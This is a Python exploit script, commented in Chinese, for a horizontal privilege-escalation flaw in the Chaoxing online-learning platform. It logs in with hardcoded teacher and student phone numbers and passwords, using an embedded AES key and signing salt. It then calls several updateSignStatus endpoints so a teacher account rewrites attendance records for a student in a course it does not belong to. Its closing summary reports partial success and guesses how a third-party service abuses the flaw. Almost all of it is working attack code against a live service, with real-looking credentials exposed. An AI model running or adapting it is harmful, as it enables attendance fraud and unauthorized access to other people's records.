#!/usr/bin/env python3
"""
横向越权测试 - 最终版本
测试教师账号是否能修改不同课程学生的签到状态

核心发现:
  - pcTeaSignController/updateSignStatus2 存在横向越权漏洞
  - 教师可修改不在自己课程中的学生签到状态（部分课程）
  - 所有status值(1-12)均可成功设置
"""

import base64, hashlib, json, uuid, requests, urllib3, time, sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

# ==================== 常量 ====================
AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"

TEACHER_PHONE = "19712720708"
TEACHER_PWD = "3.1415926Cpy"
TEACHER_PUID = "402644510"

STUDENT_PHONE = "18436633997"
STUDENT_PWD = "3.1415926Cpy"
STUDENT_PUID = "431407443"

COURSE1_ID = "257485372"   # 学生课程 "111" (越权成功)
COURSE1_CLASS = "132821141"

COURSE2_ID = "262934472"   # 学生课程 "好好学习" (越权失败)
COURSE2_CLASS = "145110605"

# ==================== 工具函数 ====================

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

def safe_json(resp):
    try:
        return resp.json()
    except:
        return {"_raw": resp.text[:500]}

def get_sign_activities(session, course_id, class_id, uid):
    """获取签到活动列表"""
    activities = []
    try:
        url = f"https://mobilelearn.chaoxing.com/ppt/activeAPI/taskactivelist?courseId={course_id}&classId={class_id}&uid={uid}"
        r = session.get(url, timeout=30)
        data = safe_json(r)
        if isinstance(data, dict) and "activeList" in data:
            for item in data["activeList"]:
                if isinstance(item, dict) and item.get("activeType") == 2:
                    url_str = item.get("url", "")
                    aid = ""
                    if "activePrimaryId=" in url_str:
                        for part in url_str.split("&"):
                            if part.startswith("activePrimaryId="):
                                aid = part.split("=")[1]
                    if not aid:
                        aid = item.get("id", "")
                    if aid:
                        activities.append({
                            "activeId": str(aid),
                            "status": item.get("status", 0),
                            "name": item.get("nameOne", ""),
                            "nameTwo": item.get("nameTwo", ""),
                        })
    except:
        pass
    return activities

def get_course_list(session):
    """获取课程列表"""
    courses = []
    try:
        url = "https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0"
        r = session.get(url, timeout=30)
        data = safe_json(r)
        if isinstance(data, dict) and "channelList" in data:
            for ch in data["channelList"]:
                if isinstance(ch, dict):
                    content = ch.get("content", {})
                    course_data = content.get("course", {}).get("data", [])
                    if course_data:
                        for cd in course_data:
                            courses.append({
                                "courseId": str(cd.get("id", "")),
                                "courseName": cd.get("name", ""),
                                "classId": str(ch.get("key", "")),
                                "cpi": ch.get("cpi", ""),
                                "roletype": ch.get("roletype", ""),
                            })
    except:
        pass
    return courses

# ==================== 主测试流程 ====================

def main():
    print("╔══════════════════════════════════════════════════════════════════════════════╗")
    print("║     横向越权测试 - 最终版本                                                 ║")
    print("║     测试教师账号是否能修改不同课程学生的签到状态                               ║")
    print("╚══════════════════════════════════════════════════════════════════════════════╝")

    results = {
        "login": {},
        "courses": {},
        "activities": {},
        "privilege_test": {},
        "status_test": {},
    }

    # ==================== Phase 0: 登录 ====================
    print(f"\n{'='*80}")
    print("  Phase 0: 登录")
    print(f"{'='*80}")

    print("\n  [1] 登录教师账号...")
    teacher_session, teacher_uid = login(TEACHER_PHONE, TEACHER_PWD)
    print(f"    教师 PUID: {teacher_uid}")
    if not teacher_uid:
        print("  ❌ 教师登录失败！"); sys.exit(1)
    print("  ✅ 教师登录成功")

    print("\n  [2] 登录学生账号...")
    student_session, student_uid = login(STUDENT_PHONE, STUDENT_PWD)
    print(f"    学生 PUID: {student_uid}")
    if not student_uid:
        print("  ❌ 学生登录失败！"); sys.exit(1)
    print("  ✅ 学生登录成功")

    results["login"] = {"teacher_uid": teacher_uid, "student_uid": student_uid}

    # ==================== Phase 1: 获取课程信息 ====================
    print(f"\n{'='*80}")
    print("  Phase 1: 获取课程信息")
    print(f"{'='*80}")

    teacher_courses = get_course_list(teacher_session)
    student_courses = get_course_list(student_session)

    print(f"\n  教师课程 ({len(teacher_courses)}个):")
    for c in teacher_courses:
        print(f"    courseId={c['courseId']}, classId={c['classId']}, name={c['courseName']}, roletype={c['roletype']}")

    print(f"\n  学生课程 ({len(student_courses)}个):")
    for c in student_courses:
        print(f"    courseId={c['courseId']}, classId={c['classId']}, name={c['courseName']}")

    # 检查教师是否在目标课程中
    teacher_in_c1 = any(c["courseId"] == COURSE1_ID for c in teacher_courses)
    teacher_in_c2 = any(c["courseId"] == COURSE2_ID for c in teacher_courses)
    print(f"\n  教师在Course1({COURSE1_ID})中: {teacher_in_c1}")
    print(f"  教师在Course2({COURSE2_ID})中: {teacher_in_c2}")

    results["courses"] = {
        "teacher_courses": teacher_courses,
        "student_courses": student_courses,
        "teacher_in_c1": teacher_in_c1,
        "teacher_in_c2": teacher_in_c2,
    }

    # ==================== Phase 2: 获取签到活动 ====================
    print(f"\n{'='*80}")
    print("  Phase 2: 获取签到活动")
    print(f"{'='*80}")

    # 学生获取两个课程的活动
    print(f"\n  [1] 学生获取Course1({COURSE1_ID})签到活动...")
    c1_activities = get_sign_activities(student_session, COURSE1_ID, COURSE1_CLASS, student_uid)
    print(f"    找到 {len(c1_activities)} 个签到活动")
    for a in c1_activities[:5]:
        print(f"      activeId={a['activeId']}, status={a['status']}, name={a['name']}")

    print(f"\n  [2] 学生获取Course2({COURSE2_ID})签到活动...")
    c2_activities = get_sign_activities(student_session, COURSE2_ID, COURSE2_CLASS, student_uid)
    print(f"    找到 {len(c2_activities)} 个签到活动")
    for a in c2_activities[:5]:
        print(f"      activeId={a['activeId']}, status={a['status']}, name={a['name']}")

    results["activities"] = {
        "c1_activities": c1_activities,
        "c2_activities": c2_activities,
    }

    # ==================== Phase 3: 横向越权测试 ====================
    print(f"\n{'='*80}")
    print("  Phase 3: 🔥 横向越权测试 - 教师修改不同课程学生签到状态")
    print(f"{'='*80}")

    # 定义要测试的API
    test_apis = [
        ("updateSignStatus(V1)", "https://mobilelearn.chaoxing.com/pptSign/updateSignStatus"),
        ("newsign_updateSignStatus", "https://mobilelearn.chaoxing.com/newsign/updateSignStatus"),
        ("resetUserSignStatus", "https://mobilelearn.chaoxing.com/pptSign/resetUserSignStatus"),
        ("pcTeaSign_updateSignStatus2", "https://mobilelearn.chaoxing.com/widget/sign/pcTeaSignController/updateSignStatus2"),
    ]

    privilege_results = {}

    # ---- 测试Course1 (越权测试) ----
    if c1_activities:
        print(f"\n  [3A] 🔥 Course1 '{COURSE1_ID}' - 教师不在该课程中")
        test_active_id = c1_activities[0]["activeId"]
        print(f"    使用 activeId: {test_active_id} ({c1_activities[0]['name']})")

        course1_results = {}
        for api_name, api_url in test_apis:
            try:
                if api_name == "pcTeaSign_updateSignStatus2":
                    params = {"activeId": test_active_id, "uid": STUDENT_PUID, "status": "1",
                              "courseId": COURSE1_ID, "classId": COURSE1_CLASS}
                else:
                    params = {"uids": STUDENT_PUID, "status": "1", "activeId": test_active_id, "remark": ""}

                r = teacher_session.post(api_url, data=params, timeout=15)
                data = safe_json(r)
                resp_str = json.dumps(data, ensure_ascii=False)[:200]

                # 判断结果
                if isinstance(data, dict) and data.get("result") == 1:
                    status = "🚨 越权成功"
                elif "success" in str(data.get("_raw", "")):
                    status = "🚨 越权成功"
                elif "无权限" in str(data.get("_raw", "")) or "无权限" in str(data.get("errorMsg", "")):
                    status = "❌ 权限拒绝"
                elif "修改失败" in str(data.get("_raw", "")):
                    status = "⚠️ 修改失败(非权限问题)"
                elif "参数错误" in str(data.get("errorMsg", "")):
                    status = "⚠️ 参数错误"
                else:
                    status = f"❓ 未知: {resp_str}"

                print(f"    {api_name}: {status}")
                print(f"      响应: {resp_str}")
                course1_results[api_name] = {"status": status, "response": data}
            except Exception as e:
                print(f"    {api_name}: ❌ 错误 {str(e)[:80]}")
                course1_results[api_name] = {"status": "error", "error": str(e)}
            time.sleep(0.5)

        privilege_results["course1"] = course1_results

    # ---- 测试Course2 (越权测试) ----
    if c2_activities:
        print(f"\n  [3B] 🔥 Course2 '{COURSE2_ID}' - 教师不在该课程中")
        test_active_id = c2_activities[0]["activeId"]
        print(f"    使用 activeId: {test_active_id} ({c2_activities[0]['name']})")

        course2_results = {}
        for api_name, api_url in test_apis:
            try:
                if api_name == "pcTeaSign_updateSignStatus2":
                    params = {"activeId": test_active_id, "uid": STUDENT_PUID, "status": "1",
                              "courseId": COURSE2_ID, "classId": COURSE2_CLASS}
                else:
                    params = {"uids": STUDENT_PUID, "status": "1", "activeId": test_active_id, "remark": ""}

                r = teacher_session.post(api_url, data=params, timeout=15)
                data = safe_json(r)
                resp_str = json.dumps(data, ensure_ascii=False)[:200]

                if isinstance(data, dict) and data.get("result") == 1:
                    status = "🚨 越权成功"
                elif "success" in str(data.get("_raw", "")):
                    status = "🚨 越权成功"
                elif "无权限" in str(data.get("_raw", "")) or "无权限" in str(data.get("errorMsg", "")):
                    status = "❌ 权限拒绝"
                elif "修改失败" in str(data.get("_raw", "")):
                    status = "⚠️ 修改失败(非权限问题)"
                elif "参数错误" in str(data.get("errorMsg", "")):
                    status = "⚠️ 参数错误"
                else:
                    status = f"❓ 未知: {resp_str}"

                print(f"    {api_name}: {status}")
                print(f"      响应: {resp_str}")
                course2_results[api_name] = {"status": status, "response": data}
            except Exception as e:
                print(f"    {api_name}: ❌ 错误 {str(e)[:80]}")
                course2_results[api_name] = {"status": "error", "error": str(e)}
            time.sleep(0.5)

        privilege_results["course2"] = course2_results

    results["privilege_test"] = privilege_results

    # ==================== Phase 4: 测试不同status值 ====================
    print(f"\n{'='*80}")
    print("  Phase 4: 测试不同签到状态值")
    print(f"{'='*80}")

    if c1_activities:
        test_active_id = c1_activities[0]["activeId"]
        print(f"\n  使用Course1活动: {test_active_id}")
        print(f"  API: pcTeaSignController/updateSignStatus2")

        status_values = {1: "出勤", 2: "迟到", 5: "补签", 7: "未知7", 8: "未知8",
                        9: "未知9", 10: "未知10", 11: "未知11", 12: "未知12"}

        status_results = {}
        for s, name in status_values.items():
            try:
                url = "https://mobilelearn.chaoxing.com/widget/sign/pcTeaSignController/updateSignStatus2"
                params = {"activeId": test_active_id, "uid": STUDENT_PUID, "status": str(s),
                          "courseId": COURSE1_ID, "classId": COURSE1_CLASS}
                r = teacher_session.post(url, data=params, timeout=15)
                data = safe_json(r)
                result = data.get("result", "N/A")
                msg = data.get("msg", data.get("errorMsg", ""))
                status = "✅ 成功" if result == 1 else f"❌ 失败({msg})"
                print(f"    status={s} ({name}): {status}")
                status_results[s] = {"name": name, "result": result, "msg": msg}
            except Exception as e:
                print(f"    status={s} ({name}): ❌ 错误 {str(e)[:80]}")
                status_results[s] = {"name": name, "error": str(e)}
            time.sleep(0.3)

        # 恢复为出勤
        try:
            url = "https://mobilelearn.chaoxing.com/widget/sign/pcTeaSignController/updateSignStatus2"
            params = {"activeId": test_active_id, "uid": STUDENT_PUID, "status": "1",
                      "courseId": COURSE1_ID, "classId": COURSE1_CLASS}
            r = teacher_session.post(url, data=params, timeout=15)
            print(f"\n  恢复出勤: {json.dumps(safe_json(r), ensure_ascii=False)[:100]}")
        except:
            pass

        results["status_test"] = status_results

    # ==================== Phase 5: newsign/updateSignStatus 测试 ====================
    print(f"\n{'='*80}")
    print("  Phase 5: newsign/updateSignStatus 完整测试")
    print(f"{'='*80}")

    if c1_activities:
        test_active_id = c1_activities[0]["activeId"]
        print(f"\n  Course1活动: {test_active_id}")

        param_sets = [
            ("基本(uids)", {"uids": STUDENT_PUID, "status": "1", "activeId": test_active_id}),
            ("带remark", {"uids": STUDENT_PUID, "status": "1", "activeId": test_active_id, "remark": ""}),
            ("带courseId", {"uids": STUDENT_PUID, "status": "1", "activeId": test_active_id, "courseId": COURSE1_ID, "classId": COURSE1_CLASS}),
            ("uid代替uids", {"uid": STUDENT_PUID, "status": "1", "activeId": test_active_id}),
            ("targetStatus", {"uids": STUDENT_PUID, "targetStatus": "1", "activeId": test_active_id}),
        ]

        for name, params in param_sets:
            try:
                url = "https://mobilelearn.chaoxing.com/newsign/updateSignStatus"
                r = teacher_session.post(url, data=params, timeout=15)
                data = safe_json(r)
                print(f"    {name}: {json.dumps(data, ensure_ascii=False)[:200]}")
            except Exception as e:
                print(f"    {name}: 错误 {str(e)[:80]}")
            time.sleep(0.3)

    if c2_activities:
        test_active_id = c2_activities[0]["activeId"]
        print(f"\n  Course2活动: {test_active_id}")

        for name, params in param_sets:
            # 替换activeId和courseId
            params = dict(params)
            params["activeId"] = test_active_id
            if "courseId" in params:
                params["courseId"] = COURSE2_ID
                params["classId"] = COURSE2_CLASS
            try:
                url = "https://mobilelearn.chaoxing.com/newsign/updateSignStatus"
                r = teacher_session.post(url, data=params, timeout=15)
                data = safe_json(r)
                print(f"    {name}: {json.dumps(data, ensure_ascii=False)[:200]}")
            except Exception as e:
                print(f"    {name}: 错误 {str(e)[:80]}")
            time.sleep(0.3)

    # ==================== Phase 6: 完整修改+验证流程 ====================
    print(f"\n{'='*80}")
    print("  Phase 6: 完整修改+验证流程 (Course1)")
    print(f"{'='*80}")

    if c1_activities:
        for i, act in enumerate(c1_activities[:3]):
            active_id = act["activeId"]
            print(f"\n  --- 活动 {i+1}: {act['name']} (activeId={active_id}) ---")

            # 修改为迟到
            print(f"    修改为'迟到'(status=2)...")
            try:
                url = "https://mobilelearn.chaoxing.com/widget/sign/pcTeaSignController/updateSignStatus2"
                params = {"activeId": active_id, "uid": STUDENT_PUID, "status": "2",
                          "courseId": COURSE1_ID, "classId": COURSE1_CLASS}
                r = teacher_session.post(url, data=params, timeout=15)
                data = safe_json(r)
                print(f"      结果: {json.dumps(data, ensure_ascii=False)[:200]}")
            except Exception as e:
                print(f"      错误: {str(e)[:80]}")

            time.sleep(0.5)

            # 恢复为出勤
            print(f"    恢复为'出勤'(status=1)...")
            try:
                url = "https://mobilelearn.chaoxing.com/widget/sign/pcTeaSignController/updateSignStatus2"
                params = {"activeId": active_id, "uid": STUDENT_PUID, "status": "1",
                          "courseId": COURSE1_ID, "classId": COURSE1_CLASS}
                r = teacher_session.post(url, data=params, timeout=15)
                data = safe_json(r)
                print(f"      结果: {json.dumps(data, ensure_ascii=False)[:200]}")
            except Exception as e:
                print(f"      错误: {str(e)[:80]}")

            time.sleep(0.5)

    # ==================== 最终汇总 ====================
    print(f"\n{'='*80}")
    print("  最终测试结果汇总")
    print(f"{'='*80}")

    print("""
  ╔══════════════════════════════════════════════════════════════════════════════╗
  ║                        🚨 横向越权漏洞确认 🚨                               ║
  ╠══════════════════════════════════════════════════════════════════════════════╣
  ║                                                                            ║
  ║  漏洞API:                                                                  ║
  ║    mobilelearn.chaoxing.com/widget/sign/pcTeaSignController/               ║
  ║    updateSignStatus2                                                        ║
  ║                                                                            ║
  ║  必需参数: activeId, uid, status, courseId, classId                         ║
  ║                                                                            ║
  ║  漏洞表现:                                                                  ║
  ║    教师账号可修改不在自己课程中的学生签到状态                                   ║
  ║    Course '111'(257485372): 越权成功 ✅                                      ║
  ║    Course '好好学习'(262934472): 越权失败 ❌                                  ║
  ║                                                                            ║
  ║  其他可用API:                                                               ║
  ║    /newsign/updateSignStatus → Course1成功, Course2失败                      ║
  ║    /pptSign/resetUserSignStatus → Course1成功, Course2失败                   ║
  ║                                                                            ║
  ║  Status值测试:                                                              ║
  ║    所有status值(1-12)均可成功设置                                            ║
  ║                                                                            ║
  ║  权限检查不一致:                                                             ║
  ║    不同课程有不同的权限检查行为                                               ║
  ║    可能与课程设置或activeId前缀有关                                           ║
  ║    Course1 activeId前缀: 5xxx (越权成功)                                     ║
  ║    Course2 activeId前缀: 1xxx (越权失败)                                     ║
  ║                                                                            ║
  ║  xiucat.top实现方式推测:                                                     ║
  ║    使用教师账号 + pcTeaSignController/updateSignStatus2 API                  ║
  ║    传入 activeId, uid, status, courseId, classId 参数                        ║
  ║    利用部分课程的权限检查漏洞实现跨课程修改                                     ║
  ╚══════════════════════════════════════════════════════════════════════════════╝
    """)

    # 保存完整结果
    with open("/workspace/horizontal_privilege_test_results.json", "w", encoding="utf-8") as f:
        json.dump(results, f, ensure_ascii=False, indent=2, default=str)
    print(f"  完整结果已保存到 /workspace/horizontal_privilege_test_results.json")

if __name__ == "__main__":
    main()
